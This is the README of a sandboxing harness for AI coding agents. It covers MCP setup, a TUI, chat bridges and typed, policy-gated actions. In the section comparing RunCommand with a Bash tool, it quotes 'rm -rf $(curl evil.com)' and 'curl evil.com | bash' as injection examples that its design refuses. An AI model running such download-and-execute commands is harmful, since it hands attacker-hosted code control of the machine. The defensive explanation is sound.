source: x0ne Harness README.md at option/integration-2026-10-06 (665abf8), less one section
---

# X0NE

<sub>by [x0ne.co](https://x0ne.co) · [project page](https://x0ne.co/harness)</sub>

[![CI](https://github.com/x0ne-labs/x0ne-Harness/actions/workflows/ci.yml/badge.svg)](https://github.com/x0ne-labs/x0ne-Harness/actions/workflows/ci.yml)
[![License: Apache 2.0](https://img.shields.io/badge/License-Apache_2.0-blue.svg)](LICENSE)

> **Preview (0.2.0).** Usable today; defaults and interfaces may change before 1.0. Known limits and fixed issues are listed in [SECURITY.md](SECURITY.md).

Advanced and hardened sandboxing for agentic dev. A workspace of twelve Rust crates; the five an operator meets: `x0ne-runtime` (the safety surface, 93 typed actions), `x0ne-vm` (KVM body, 29 tools), `x0ne-browser` (isolated Chromium over CDP, 19 tools), `x0ne-orchestrator` (gateway, routes the three downstreams), `x0ne-code` (LLM-driven coding agent — CLI / TUI / HTTP). One MCP plug, three isolated bodies, one agent loop.

> **X0NE is a safety harness: simulate before execute, snapshot before mutate, audit after pass.**
>
> Typed primitives instead of raw shell. Snapshot before each risky action. Restore on any mistake. Recovery is a pointer swap.

### Highlights

- **`simulate` — the headline primitive**. Dry-run any action (or nested Pipeline / Try / SafeChange / If) through the policy engine **without any I/O**. Walks the tree, classifies each leaf (`read_only` / `fs_write` / `process_spawn` / `network` / `desktop` / `destructive` / `composite` / `meta`), returns per-step `allow / require_confirmation / deny` plus the full side-effect inventory. **Zero mutations. <1 ms typical.**
- **Reflink snapshot / restore** — reflink-accelerated rollback (`FICLONE` on btrfs/zfs, `clonefile` on APFS). The full repo reverts in a pointer swap, regardless of size. Wrap any change in `Try` or `SafeChange` and a failed test-pass auto-rolls everything back atomically.
- **Three isolated bodies**. The agent picks the smallest one per task: `x0ne-runtime` (sandboxed host shell + 93 typed actions), `x0ne-vm` (full QEMU/KVM with linked-clone pool), `x0ne-browser` (isolated Chromium CDP, allowlist + audit + abort switch).
- **Persistent goals via MCP** — `x0ne_goal_set` writes to `~/.x0ne/goals/<id>.json`. Set a goal from Claude Code on Tuesday, query its status from Codex on Friday. Cross-tool, cross-session, durable.
- **One-shot templated tool calls** — `RenderTemplate` lets the LLM emit a single fluent sentence with `{{tool(args)}}` placeholders that the runtime fills in-place. **One LLM round-trip** instead of two. See [docs/actions.md › `RenderTemplate`](docs/actions.md#rendertemplate).

### The cut

The toolbelt used to be ~109 MCP tools. We removed **51 trivial primitives** the agent's sandboxed shell does better in one line (math, strings, comparisons, half of the filesystem ops, JSON/TOML setters, `git status` / `git diff`, system trivia like `whoami` / `uptime` / `system_info`, introspection meta-tools, `browse_url`). What's left is what shell **can't** do: typed safety, snapshots, simulate, composition, audit.

### Add to Claude Code in 30 seconds

```bash
git clone https://github.com/x0ne-labs/x0ne-Harness && cd x0ne-Harness
make install                # build + install the 3 binaries
make claude-add             # registers BOTH 'x0ne' (runtime) AND 'x0ne-gateway' (orchestrator)
```

Two MCP servers get registered in one shot:

| Server | Tools | Use when |
|---|---|---|
| `mcp__x0ne__*` | 100 runtime primitives | You only need typed file/exec/git/snapshot/desktop primitives |
| `mcp__x0ne-gateway__*` | Same 100 + 14 orchestrator tools | You want goals (`x0ne_goal_set`), plans (`x0ne_plan` / `x0ne_plan_execute`), pre-execution preview (`x0ne_simulate`), and host-only primitives (`x0ne_artifact_expose`) |

Each call is policy-gated, returns structured JSON, and is logged to `~/.x0ne/sessions/`. Verify with `claude mcp list`:

```
x0ne:         x0ne-runtime --mode mcp --log-level error              - ✓ Connected
x0ne-gateway: x0ne-orchestrator --mcp --downstream-runtime x0ne-runtime - ✓ Connected
```

Then in any Claude Code session: *"set a goal to refactor my auth and make all tests pass, then plan the steps"* — the model reaches for `mcp__x0ne-gateway__x0ne_goal_set` and `mcp__x0ne-gateway__x0ne_plan`, the goal persists across sessions in `~/.x0ne/goals/`, and any future `x0ne_goal_step` is policy-checked. To unregister later: `make claude-remove`.

### Add to Codex in 30 seconds

```bash
git clone https://github.com/x0ne-labs/x0ne-Harness && cd x0ne-Harness
make install
make mcp-codex              # alias for `make codex-add` — registers BOTH entries in ~/.codex/config.toml
```

This writes two MCP server entries to `~/.codex/config.toml`:

```toml
[mcp_servers.x0ne]
command = "/home/you/.cargo/bin/x0ne-runtime"
args = ["--mode", "mcp", "--log-level", "error"]

[mcp_servers.x0ne-gateway]
command = "/home/you/.cargo/bin/x0ne-orchestrator"
args = ["--mcp", "--downstream-runtime", "x0ne-runtime", "--log-level", "warn"]
```

Restart Codex, and you get the same two surfaces as in Claude Code (runtime alone + gateway with goal/plan/simulate). To unregister later: `make codex-remove`.

> **Why MCP?** X0NE becomes the **safe execution backend** for any MCP-aware agent (Claude Code, Codex, Cursor, OpenCode, Zed, …). Your host agent gets typed primitives, snapshot/restore, multi-pattern search, sandboxed exec, persistent goals, plan ledgers, and the privilege boundary for free. See [§ MCP](#mcp-use-with-claude-codex-cursor-opencode-zed) for the full integration table.

### 30-second demo

```bash
make demo-undo-fast      # or: ./scripts/demo-undo.sh --no-pause
```

Plays out an agent destroying a fake payment service, then time-travels back via `RestoreSnapshot`, all 6 files + missing parent dirs reconstructed.

### Quick Start

```bash
git clone https://github.com/x0ne-labs/x0ne-Harness && cd x0ne-Harness
make install            # builds + installs the 3 binaries to ~/.cargo/bin/
                        # plus runtime profiles to ~/.config/x0ne/
x0ne                    # first run auto-launches the configuration wizard
                        # (model, provider) — re-run anytime with
                        # `x0ne --setup`, or `/setup` from inside a session
```

That's it. **No container required.** X0NE runs directly on your host — Linux or macOS (the platforms the release workflow builds). On Linux, commands run under bubblewrap (`bwrap`) when it is installed (see [docs/security.md](docs/security.md)); snapshot/restore stays **O(1)** wherever the filesystem supports reflink:

| Filesystem | Snapshot speed | OS |
|---|---|---|
| btrfs / zfs | O(1) reflink (FICLONE) | Linux |
| APFS | O(1) clonefile | macOS |
| ext4 / others | byte-copy fallback (still functional) | Linux |

To remove X0NE: `make uninstall` removes the binaries and the MCP registrations and keeps `~/.config/x0ne` (`make uninstall PURGE=1` lists, then deletes it) and `~/.x0ne/` user data: sessions, snapshots, goals, memory.

### Optional: full container sandbox

If you want **process isolation** on top of snapshot/restore — e.g. to run untrusted code via `RunInSandbox`, or to give the agent a fresh filesystem each turn — opt in via:

```bash
make setup-podman    # Linux + macOS + Windows (uses Podman Machine on Mac)
make setup-incus     # Linux only — fastest, btrfs storage pool, baseline container
```

Each needs the daemon already installed: when the `incus` or `podman` CLI is missing, the target stops, installs nothing, and prints the `scripts/install-sandbox-backend.sh` command to run yourself (sudo). With the CLI present it creates the `x0ne-sandbox` container and captures a baseline snapshot. Idempotent, safe to re-run. With one of these installed, plain `x0ne` auto-detects the container and runs the runtime inside it; without it, you stay on host mode with snapshot fallback. For production / CI that requires fail-closed semantics, set `X0NE_REQUIRE_SANDBOX=1`.

```bash
# Non-interactive, run a single prompt and exit
x0ne -p "what OS is this and how much disk is free"

# Pipe mode, feed stdin as context
cat error.log | x0ne --stdin -p "explain this error and fix it"

# @file references, inject file contents inline
x0ne -p "refactor @src/main.rs to use async"

# Autonomous mode, continuous loop with git checkpoints
x0ne --auto-mode --max-iterations 30
```

```
Orchestrator (LLM loop) ──[Bridge: stdio / HTTP / SSH]──▶ Core (executor + policy)
```

---

## The TUI

`make run-tui` (or `x0ne --tui`) launches it. There is exactly one TUI — `--tui2` was a second name for this same screen and was removed on 2026-08-16.

```
┌─ X0NE ─────────────────────  ◆ claude-sonnet  · 3.7k tk · $0.00 ───┐
│ session: pb64                 ○ stdio              runtime ●  vm ○ │
├────────────────────────────────────────────────────────────────────┤
│  ╭─ x0ne ──────────────────────────────────────────────╮ panel:    │
│  │ Let me list `/etc/hostname`…                        │  ● conv   │
│  │                                                     │  📋 queue │
│  ╰─────────────────────────────────────────────────────╯  ✓ tasks  │
│  ReadFile · /etc/hostname                                 ⏰ cron   │
│    └ 3B (<1ms)                                            ▶ pipeline│
│      ┌─ output ──┐                                        ❤ pulse  │
│      │ hp        │                                                  │
│  ⋯ x0ne is thinking · 2.3s                                ◐ snaps   │
├────────────────────────────────────────────────────────────────────┤
│ ❯ Type a message · Tab to switch panel · Enter to send             │
└── ^Tab panel · ^B focus · ^E expand · ^C quit · F1 help ───────────┘
```

### Side panels (Tab / Shift-Tab to cycle)

| Glyph | Panel | Purpose |
|---|---|---|
| ● | **conv** | Main conversation + tool trail (default) |
| 📋 | **queue** | Pre-typed messages waiting for the agent to free up |
| ✓ | **tasks** | Live TODO list — agent populates via `TaskAdd` / `TaskDone`, you can `/task add` too |
| ⏰ | **cron** | Scheduled reminders / self-triggers with live countdown |
| ▶ | **pipeline** | Per-step breakdown of the most-recent `Pipeline` action (status · duration · summary) |
| ❤ | **pulse** | Session heart-rate monitor — every turn / tool / snapshot / question as a coloured dot |
| ◐ | snaps · ⏳ handles · ▦ worlds · ◆ goal | Snapshots, async handles, parallel agents, persistent goals |

### Keyboard
- `Tab` / `Shift-Tab` cycle panels · `^B` focus mode (hide panel) · `^E` expand all action heads
- `↑` `↓` history at textarea edges, scroll otherwise · `PgUp`/`PgDn`/`Home`/`End`/wheel for the trail
- `F1` (or `/help` · `^?`) opens a 3-column cheat sheet — keyboard · slash & panels · agent actions
- `^C` quit anytime, even inside modals

### Slash commands (user-driven, no LLM round-trip)
```
/task add <title>            queue a TODO  · /task done <id>  · /task clear
/cron in <secs> <label>      passive reminder
/cron in <secs> <label> -> <prompt>   self-trigger (agent receives the prompt when due)
/cron cancel <id>            cancel before it fires
/help · /?                   cheat-sheet overlay
/quit · /q · :q              exit
```

### Agent meta-actions (LLM emits these — surfaced live in the panels)
- **`AskUser`** — multi-choice modal asking you to pick. The agent uses this whenever a decision is non-obvious. Auto-triggered when a runtime `policy_denied` arrives, so the policy gate becomes a dialog instead of a wall.
- **`TaskAdd` / `TaskDone` / `TaskClear`** — externalise the plan into the Tasks panel.
- **`CronSchedule` / `CronCancel`** — schedule a reminder or a self-trigger (the runner ticks once per second and fires due crons).
- **`PaintBadge`** — repaint the X0NE logo slot in the header with an LLM-painted ASCII frame (static or multi-frame animation).
- **`Simulate`** — dry-run any action / pipeline through the policy engine without side effects (the "what would happen?" primitive).

### Auto-AskUser on policy_denied
When the runtime rejects an action because it needs human approval (`RunInSandbox`, `ArtifactCreate`, write-side ops in `confirm` mode…), the TUI doesn't dump a red wall of text. It pops a calm 2-option modal:

```
  ❯ pick one · Enter to confirm

  X0NE wants to run Pipeline · how should it proceed?
    Policy says: Pipeline step 0 (RunInSandbox) requires confirmation

  › ◉  Find a safer way     (Recommended)
        X0NE picks a non-destructive equivalent — e.g. Simulate to
        preview, RunInSandbox for compute, or a read-only batch.
    ○  Stop and explain
        X0NE aborts this step. It'll tell you what it would have
        done so you can decide whether to switch policy to 'allow'.

   ↑/↓ navigate · Enter pick · Esc cancel
```

Both branches are honest about what actually happens next. Your choice lands in the tool-result slot the LLM sees, so the next turn reacts.

### Session jsonl — exhaustive audit trail
Every action the agent dispatches is logged to `~/.x0ne/sessions/<ts>.jsonl`, including meta-actions (`AskUser`, `TaskAdd`, `CronSchedule`, `PaintBadge`). For each invocation you get **two lines**: the request (as requested) and the full result envelope (as executed):

```jsonl
{"type":"action","action_type":"AskUser","action":{"question":"…","type":"AskUser"},"duration_ms":12340,"success":true,"ts":"…"}
{"type":"action_result","action_type":"AskUser","result":{"output":{"selected":["Find a safer way"],"custom_text":null},"success":true},"ts":"…"}
```

`jq` your way through it for replay, dataset extraction, or post-mortem.

### Live status line
A 1-row dim italic strip just above the input shows what X0NE is doing right now — `⋯ x0ne is thinking · 2.3s` while the LLM chews on the prompt, `✎ x0ne is writing · ~142 tok` during streaming, `▶ x0ne is running Pipeline · 12s` while a tool is in flight. Zero space when idle.

### Web search

```
<action>{"type":"WebSearch","query":"rust tokio mpsc broadcast","limit":10}</action>
```

Two backends, same envelope:
- **Brave Search API** when `X0NE_BRAVE_API_KEY` is set (2000 reqs/month free)
- **DuckDuckGo HTML scrape** otherwise (no key, may rate-limit on heavy use)

The Brave path auto-falls back to DDG if the key is rate-limited / expired. Result shape:

```json
{"kind":"web_search_result","query":"…","source":"ddg","count":10,
 "results":[{"title":"…","url":"https://…","snippet":"…"}, …]}
```

### Sources panel — session bibliography (📚)

Every URL the agent touches — `FetchUrl`, `BrowseWeb`, **every WebSearch result** — auto-lands in the `📚 sources` side panel with title, status, and age. The underlying jsonl already has the full request + result envelope per action; the panel is the at-a-glance summary so you can trace where each fact in the agent's reply came from. Most terminals make the URLs clickable directly.

### Shell mode (`Ctrl+S`) — X0NE becomes your shell

Press `Ctrl+S` from anywhere in the TUI to enter **shell mode**: the body switches to a real terminal trail, the input bar turns into a `$` prompt, and every Enter spawns a `bash -c` on the host (same trust domain as your normal shell, not the sandbox — that's what `RunCommand` is for when the LLM drives).

```
╭ 🐚  shell · /home/user/x0ne ────────────────────────────────────────╮
│  Esc / ^S to return · Up to recall last command · cd persists ·      │
│  `exit` returns to agent                                             │
│                                                                      │
│  $ git status                                                        │
│      On branch main                                                  │
│      Your branch is up to date with 'origin/main'.                   │
│      └ ✓ exit=0 · 12ms                                               │
│                                                                      │
│  $ cargo test --release                                              │
│      … (compiling 78 crates)                                         │
│      test result: ok. 1323 passed; 0 failed                          │
│      └ ✓ exit=0 · 2m14s                                              │
╰──────────────────────────────────────────────────────────────────────╯
```

- **CWD persists** across commands — `cd src/` works, then `ls` runs there, then `cd ..` returns. Tracked client-side because each `bash -c` is a fresh process.
- **Builtins**: `cd <dir>` (with `~` expansion), `exit` / `quit` / `q` (back to agent), `Up` arrow recalls last command.
- **Output capped at 64 KB** per command so a stray `cat huge.bin` can't OOM the TUI.
- **Audit**: every command + output goes to `~/.x0ne/sessions/<ts>.jsonl` and to the `❤ pulse` panel.

### Agent sees your shell context

When you exit shell mode and send the next message to the agent, the **shell trail since last turn** is prepended automatically as a system note:

```
[shell trail since last turn]
$ git status
  ↳ exit=0 · (12ms)
  stdout: On branch main · clean
$ cargo test --release
  ↳ exit=0 · (134000ms)
  stdout: test result: ok. 1323 passed; 0 failed

now diagnose why the build was slow.
```

The LLM reads what you just did and reacts to it — no copy-pasting outputs into chat. Up to 8 most-recent commands shared per turn, then the trail is cleared so the agent only sees fresh activity going forward.

### Multimodal — `@file.png` for vision

Drop a `@*.png/.jpg/.jpeg/.webp/.gif` reference anywhere in your message and X0NE loads + base64-encodes the file and attaches it to the next LLM turn:

```
> Compare these two layouts: @~/Desktop/before.png @~/Desktop/after.png
🖼 attached 2 images for vision: before.png, after.png
```

The vision plumbing flows through `Message.images: Vec<ImageAttachment>` → routed to Anthropic's multi-part content blocks or Ollama's `images` array, depending on the active backend. Max 8 MB per image, tilde (`@~/…`) expanded, dedup, trailing punctuation stripped. PDFs are deferred for v2 (Anthropic supports them, Ollama doesn't).

---

## Remote control — chat bridges

Two transports, same agent loop. Pick the one that fits your trust model:

| | **Telegram** | **Matrix** |
|---|---|---|
| Setup | 30s — bot token from @BotFather | 5min — Matrix account on any homeserver |
| Self-host | No | **Yes** — run your own Conduit/Dendrite |
| E2EE | Opt-in (Secret Chats) | **Default** |
| Protocol | Closed (MTProto) | **Open** (IETF-ish Client-Server API) |
| AskUser UX | Inline keyboard buttons | Numbered options + reaction emojis |
| Mobile clients | Telegram | Element, FluffyChat, Cinny, NeoChat, …    |
| Best for | Mass-market, quick remote | Data sovereignty, FOSS, dev communities |

Run them **separately or together** — both are headless modes that share the agent loop with the TUI.

### Telegram bridge

Drive X0NE from your phone. Smooth one-scan pairing, then chat-driven control with native AskUser buttons.

### Pairing (one scan)

```bash
x0ne --telegram-setup
```

You'll be asked for a bot token (get one from `@BotFather` if you don't have one — takes 30s). X0NE then renders a QR code in the terminal:

```
  Scan this QR with your phone:

   █▀▀▀▀▀█ ▀▄█▀▄ █▀▀▀▀▀█
   █ ███ █ ▄█▀█▀ █ ███ █
   █ ▀▀▀ █ ▀▄▀ █ █ ▀▀▀ █
   ▀▀▀▀▀▀▀ █▄█▀█ ▀▀▀▀▀▀▀
   …

  ▸ bot:   @YourX0neBot
  ▸ link:  https://t.me/YourX0neBot?start=a1b2c3d4e5f60718
  ▸ token: a1b2c3d4e5f60718

  Waiting for /start a1b2c3d4e5f60718 ...
  (expires in 300s · Ctrl-C to cancel)
```

Scan with the camera → Telegram opens the bot → tap "Start" → your `chat_id` is whitelisted and saved to `~/.x0ne/telegram.toml` (mode 0600). Done.

### Running

```bash
x0ne --telegram        # headless bridge — chat ↔ agent loop
```

The bridge uses the same agent loop as the TUI. Inbound chat messages become `UserInput`s; the agent's responses are sent as Telegram messages. Tool calls are summarised one-per-line. **`AskUser` modals become inline-keyboard buttons** — tap the option on your phone, the choice lands in the agent's tool-result slot, the turn continues. Perfect for mobile.

### Security

- Bot token in `~/.x0ne/telegram.toml` (mode 0600 on Unix). Never logged, never sent to the LLM.
- Only whitelisted `chat_id`s reach the agent — unknown chats get a polite refusal and bounce.
- Pairing tokens are single-use, 5-minute TTL.
- Every inbound message is audited in `~/.x0ne/sessions/<ts>.jsonl` like a TUI session.

### Matrix bridge

Drive X0NE from any Matrix client (Element, FluffyChat, Cinny…). Open protocol, end-to-end-capable, self-hostable.

#### Pairing (one scan)

```bash
x0ne --mx-setup
```

You'll be asked for: homeserver URL (e.g. `https://matrix.org`), bot user (e.g. `x0nebot`), bot password. X0NE logs the bot in, fetches an access token, then renders a QR code pointing at `https://matrix.to/#/@x0nebot:server.org`. Scan it with the camera on your phone → your Matrix client opens the bot's profile → tap "Start chat" → X0NE sees the new DM, captures your Matrix ID, and whitelists it.

```bash
x0ne --mx                # headless bridge — DM ↔ agent loop
```

#### In-TUI slash commands

You don't have to leave the TUI to talk to either bridge:

```
/telegram               status (paired chats, bot username)
/telegram msg <text>    send a one-shot message to the default chat
/tg, /tg msg <text>     short aliases

/mx                     status (paired Matrix IDs, homeserver, bot)
/mx msg <text>          send to the paired DM room
```

Useful for: pinging your phone from the desk session, testing the bridge wiring, pushing build/test notifications via slash without spinning up a separate script. Pairing (`/telegram setup` / `/mx setup`) needs the host terminal for the QR scan and the rpassword prompt, so those slashes just remind you to run `x0ne --telegram-setup` / `x0ne --mx-setup` outside the TUI.

#### AskUser on Matrix

Matrix doesn't have inline keyboards, so the bridge renders multiple-choice questions as a numbered message:

```
❓ X0NE wants to run Pipeline · how should it proceed?
_This action needs your approval. Reason: requires confirmation_

1️⃣  Find a safer way
2️⃣  Stop and explain
```

X0NE then reacts to its own message with `1️⃣` and `2️⃣` so they show as tappable buttons under the message in any Matrix client. Tap the emoji you want — X0NE sees the `m.reaction` event and treats it as the answer. Native to every client, no custom extension needed.

#### Security

- Access token in `~/.x0ne/matrix.toml` (mode 0600). Never logged, never sent to the LLM.
- Only whitelisted Matrix IDs reach the agent.
- Every inbound message is audited in `~/.x0ne/sessions/<ts>.jsonl`.
- Direct HTTP to the Client-Server API — no `matrix-rust-sdk` dep (kept the build lean).

---

## Architecture

```
x0ne-orchestrator          x0ne-runtime
├── TUI (ratatui)          ├── Action parser (JSON → typed enum)
├── Matrix Mode            ├── Policy engine (deny / allow / confirm)
├── CLI (rustyline)        ├── Executor (93 typed actions)
├── LLM backends           ├── Composite primitives (user-defined)
│   Ollama / Anthropic     ├── Handle manager (async events)
│   OpenAI-compat          ├── Snapshot engine (FS, reflink-aware)
│   (multi-profile, hot-   ├── Try / SafeChange (auto-snapshot rollback)
│   swap via /provider)    ├── MCP server (tools/list, tools/call)
├── Non-interactive (-p)   └── Path canonicalization (anti-traversal)
├── Autonomous (--auto)
├── MCP gateway (22 tools —
│   gates the runtime's
│   93 typed actions):
│   • x0ne_plan / _execute
│     (single-use ledger)
│   • x0ne_simulate
│     (pre-flight, no I/O)
│   • x0ne_goal_set / step /
│     status / pause / resume /
│     complete / clear
│     (persistent ~/.x0ne/goals/)
│   • x0ne_artifact_expose
│     (privilege boundary)
├── Orchestrator-first
│   dispatch (sysaicalls
│   + Pipeline interception)
├── Multi-agent (SpawnAgent
│   / SpawnWorld / WaitAgent /
│    BroadcastAgents)
├── Incus container mgmt
│   (RunIncus, RunIncusGroup,
│   Incus*Snapshot, outside
│   the runtime's privilege
│   boundary by design)
├── X0NE.md (project memory)
├── Codebase indexing
├── @file injection
├── Session audit logger (JSONL)
├── Execution target display
│   (🛡 sandbox / ⚡ local / 🌐 remote)
├── /export (JSON for fine-tuning)
├── Loop protection
│   (anti-loop, hints)
└── Bridge
    (stdio / HTTP / SSH+Incus)

x0ne-mcp (shared lib)        x0ne-code (`x0ne` binary)
├── JSON-RPC 2.0 types       ├── CLI / TUI / Matrix entrypoint
├── line-delimited stdio     ├── -p one-shot, --stdin pipe
└── ChildMcpClient           └── --auto autonomous loop
    (downstream proxy)           consumes orchestrator as lib
```

> **Privilege boundary**, anything that modifies the runtime's environment
> (containers, host-side artifact exposure, sub-agent spawning) lives in
> the orchestrator, not the runtime. The runtime literally cannot compile
> a `RunIncus` action; the orchestrator intercepts these before the bridge
> dispatch and runs `incus` itself on the host. The LLM sees the same
> wire format either way.

### How artifacts are served

When the agent emits `ArtifactCreate`, files (HTML/CSS/JS, optional Python/Node
source) live in the **runtime's** trust domain — never on the host disk if the
runtime is sandboxed. Two HTTP servers carry them to the user's browser:

```
USER BROWSER ─── http://localhost:7800 ────► x0ne-orchestrator (always on host)
                                                    │
                                                    │  reverse-proxy /a/<id>/...
                                                    ▼
host mode                                   sandbox mode
─────────                                   ────────────
runtime on host                             runtime in container
  127.0.0.1:7900                              <bridge-IP>:7900
  serves ~/.x0ne/artifacts/                   serves /root/.x0ne/artifacts/
                                              (files stay in the container,
                                               no host bind mount, no agent
                                               source ever touches host disk)
```

The orchestrator never reads or executes artifact bytes — it only forwards
them as opaque HTTP. URLs are always `localhost:7800/a/<id>/`, regardless of
mode. The container's bridge IP is auto-detected from the `--downstream-prefix`
on startup; override with `X0NE_RUNTIME_UPSTREAM=<host>:<port>`.

---

## Primitives

**100 typed runtime actions + 14 orchestrator native tools + scripted-function family (DefineFunction / CallFunction / ListFunctions / DeleteFunction — agent-extensible Tier 1, Rhai today / WASM next). Every primitive takes typed input, returns typed output, goes through the policy engine.**

### Filesystem

| Action | Description | Mutable |
|--------|-------------|---------|
| `ReadFile` | Read file with optional offset/limit | No |
| `WriteFile` | Create or overwrite a file | Yes |
| `EditFile` | Multiple find-and-replace edits | Yes |
| `ApplyPatch` | Apply unified diff | Yes |
| `MoveToTrash` | Move to OS trash | Yes |

### Search

| Action | Description | Mutable |
|--------|-------------|---------|
| `SearchCode` | Regex search inside file contents, single (`pattern`) or multi-needle OR (`patterns: [...]`, compiled into one `RegexSet`, single walk) | No |

```json
// Multi-pattern: 3 needles, ONE round-trip, ONE walk
{"type": "SearchCode", "root": "./src", "patterns": ["TODO", "FIXME", "XXX"], "file_glob": "*.rs"}

// Multi-glob: find all source/config/doc files in one call
```

`patterns` (array) takes precedence over `pattern` (string). Same trick as `ripgrep -e p1 -e p2 -e p3`, saves 5–10× round-trips when an LLM is hunting for multiple things at once. The output's `pattern` field is rendered as `(p1|p2|p3)` for readability.

### Network

| Action | Description | Mutable |
|--------|-------------|---------|
| `FetchUrl` | HTTP GET | No |
| `HttpRequest` | Full HTTP (GET/POST/PUT/PATCH/DELETE/HEAD) | Yes |

### Git

| Action | Description | Mutable |
|--------|-------------|---------|

### Execution

| Action | Description | Mutable |
|--------|-------------|---------|
| `RunCommand` | Run a whitelisted command | Yes |
| `RunInSandbox` | Run in ephemeral Podman container (image allowlist, resource caps, file collection) | Yes |
| `RunContainerGroup` | Run N Podman containers in parallel (semaphore-limited concurrency) | Yes |
| `Pipeline` | Sequence of actions with stop-on-error and optional snapshot | Yes |
| `RenderTemplate` | **One-shot template substitution** — LLM emits `"Il y a {{str_count(\"strawberry\",\"r\")}} r"`, runtime calls the tool, splices `3` back in. **Saves a full LLM round-trip** vs the classic tool-call → re-prompt loop. Two placeholder forms: call (`{{ tool(args) }}`) or JSON (`{{ Pascal {…} }}`). See [docs/actions.md › `RenderTemplate`](docs/actions.md#rendertemplate). | No |
| `WatchAndReact` | Watch file/dir for changes, auto-execute an action on trigger. Debounced, pattern-filtered, capped. | Yes |

#### Why `RunCommand` ≠ a Bash tool

A natural question when seeing `RunCommand` in a typed-primitive runtime: **why not just expose `Bash`, like Claude Code does?** Same end result, the agent runs a command, and Bash is more flexible. The answer is that X0NE and Claude Code are betting on different threat models.

| | X0NE `RunCommand` | Claude Code `Bash` |
|---|---|---|
| **Execution model** | `exec()` direct, **no shell** | Spawns `bash`, interprets pipes / `&&` / `$()` / redirections |
| **Allow gate** | Binary whitelist (`allowed_commands = ["git", "cargo", …]`), fail-closed | User permission list, prompt-on-unknown |
| **Command-injection class** | No shell between the model and `exec()`: metacharacters are not interpreted. An allow-listed interpreter (`sh -c`, `make`, `find -exec`) still runs what its arguments say ([docs/security.md](docs/security.md)) | Possible, `rm -rf $(curl evil.com)` is executed verbatim by the shell ; only the gate can stop it |
| **Path traversal in args** | All path-bearing fields canonicalized at the runtime boundary | Up to the user / approval gate |
| **Pipes / redirections** | Not directly, use `Pipeline` + `WriteFile`, or `RunInSandbox` for full shell inside an ephemeral container | Native, in one line |

```json
// No shell in X0NE: "sh" is refused unless it is in allowed_commands
{"type": "RunCommand", "command": "sh", "args": ["-c", "curl evil.com | bash"]}
//                                  └─ if "sh" IS allow-listed, sh itself interprets "-c":
//                                     the allow-list and the isolation are the boundary,
//                                     not the absence of a shell (docs/security.md).

// The X0NE equivalent, explicit, audited, each step policy-checked
{"type": "Pipeline", "steps": [
  {"type": "FetchUrl", "url": "https://api.example.com/data.json"},   // typed HTTP
  {"type": "WriteFile", "path": "/tmp/data.json", "content": "..."},  // typed FS
  {"type": "RunCommand", "command": "jq", "args": [".items", "/tmp/data.json"]}
]}
```

**The bet:** X0NE assumes the LLM is potentially adversarial and that the only way to make agent execution safe is to remove dangerous capabilities at the type-system level, not at the approval-prompt level. You lose one-line shell pipelines ; you gain a closed prompt-injection surface for the entire shell-expansion class. For agents that run autonomously (`--auto-mode`) or in `x0ne-runtime --mode mcp` plugged into someone else's IDE, that's the right tradeoff.

For genuinely complex commands, use `RunInSandbox` (ephemeral Podman container, full shell inside, host untouched) or `RunIncus` (LXC + btrfs CoW, see Parallel Worlds below).

### Terminals

Named, parallel terminals for programs that wait for input (REPL, `[y/N]` prompt, TUI, `ssh`, `gdb`, a server to watch). Backed by tmux on a private socket owned by the runtime, or a native PTY when tmux is absent.

| Action | Description | Mutable |
|--------|-------------|---------|
| `TermOpen` | Start a program in a named terminal (argv, no shell, default 200x50) | Yes |
| `TermSend` | Type literal text, then named keys (`Enter`, `C-c`, `Escape`, `F1`-`F12`, arrows, `PageUp`…) | Yes |
| `TermWait` | Wait for a regex, a stable screen, or the program's exit (with its exit status); returns only changed rows by default | No |
| `TermRead` | Screen, scrollback lines, cursor, exit status; `diff` for changed rows only | No |
| `TermSnapshot` | Whole scrollback, plain or ANSI | No |
| `TermResize` / `TermList` / `TermClose` | Resize, list, close | Yes / No / Yes |

- **Policy.** `TermOpen` meets the same gates as `RunCommand` (allowlist, cwd, isolation). `TermOpen`, `TermSend` and `TermResize` are `ProcessSpawn`: off by default, refused in `readonly`, asked in `confirm`. On the host, each `TermSend` is approved one at a time (no per-terminal grant, never dispensed by trust roots): a terminal holding a shell runs whatever is typed. Under `--isolation container` with a detected container, the allowlist does not filter `TermOpen`; the container is the boundary.
- **Caps** (`[term]`): `max_sessions` (8), `max_read_bytes` (65536), `max_wait_ms` (300000).
- **Audit.** Every terminal is recorded as asciicast v2 (`asciinema play`), and every open, send, resize and close is appended to `audit.jsonl`, under `~/.x0ne/term/<run>/`. All terminals are killed when the runtime exits, including on SIGKILL.

### System

| Action | Description | Mutable |
|--------|-------------|---------|
| `FileInfo` | File metadata | No |
| `Checksum` | SHA-256 / MD5 / SHA-1 | No |
| `ListProcesses` | Running processes | No |
| `PortCheck` | TCP port check with latency | No |
| `DnsLookup` | Hostname → IP | No |

### Data

| Action | Description | Mutable |
|--------|-------------|---------|
| `RandomBytes` | Cryptographic random bytes (hex/base64) | No |

### Math

18 pure arithmetic operations, no side effects, always allowed:

`Add` `Sub` `Mul` `Div` `Mod` `Abs` `Pow` `Sqrt` `Min` `Max` `Round` `Compare` `Gt` `Lt` `Eq` `Clamp` `Sum` `Avg`

### String

9 pure string operations, no side effects, always allowed:

`StrLen` `StrContains` `StrCount` `StrReplace` `StrSplit` `StrUpper` `StrLower` `StrTrim` `StrSlice`

> `StrContains` and `StrCount` accept `input`, `text`, or `string` as aliases for `haystack`. `StrSlice` clamps `end` to string length (Python-style, no error on out-of-bounds end).

### Memory

Namespaced key-value store persisted to `~/.config/x0ne/memory/`:

| Action | Description | Mutable |
|--------|-------------|---------|
| `Remember` | Store a key-value pair | Yes |
| `Recall` | Retrieve a value by key | No |
| `Forget` | Delete a key | Yes |
| `ListMemory` | List all keys in a namespace | No |

### Validation

| Action | Description | Mutable |
|--------|-------------|---------|
| `Validate` | Type/schema/range checks on values | No |
| `Diff` | Unified diff between strings or files | No |

### Human interaction

| Action | Description |
|--------|-------------|
| `AskHuman` | Prompt operator for input |
| `Confirm` | Yes/no confirmation gate |
| `AskMultipleChoice` | Multiple-choice selection |

### Snapshots

| Action | Description | Mutable |
|--------|-------------|---------|
| `CreateSnapshot` | Backup specified paths | Yes |
| `RestoreSnapshot` | Restore snapshot | Yes |
| `ListSnapshots` | List snapshots | No |
| `DeleteSnapshot` | Delete snapshot | Yes |

### Handles & Events

| Action | Description |
|--------|-------------|
| `Subscribe` | Watch file changes, process exit, port open |
| `CheckHandle` | Drain buffered events |
| `StopHandle` | Cancel handle |
| `ListHandles` | List active handles |
